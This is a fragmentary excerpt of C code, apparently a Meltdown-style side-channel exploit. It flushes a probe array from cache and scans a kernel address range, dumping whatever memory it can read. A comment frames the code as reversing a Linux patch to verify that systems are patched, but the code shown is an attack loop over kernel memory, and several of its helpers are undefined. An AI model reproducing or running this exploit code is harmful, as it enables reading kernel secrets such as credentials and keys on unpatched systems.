...
int read_via_revengmeltdown(const char* target) {
  for (uint32_t i = 0; i < 256; ++i) {
    _mm_clflush(detector + i*4096);
  }
  do_kernel_thing();
  revengmeltdown(target, detector);
...
Attempts to reverse the linux patch via debian security mailing list info to verify our systems are patched.  Will be applied to Newell Menerick x86 Ring -1 project.
  ...
  if (argc < 2) {
    for (const char* p = (const char*)0xffffffff80000000ULL; p < (const char*)0xffffffffc0000000ULL; p += 1024) {
      for (const char* q = p; q < p + 128; q += 64) {
        if (read_via_revengmeltdown(q) >= 0) {
          dump_range(q);
          printf("---\n");
        }
      }
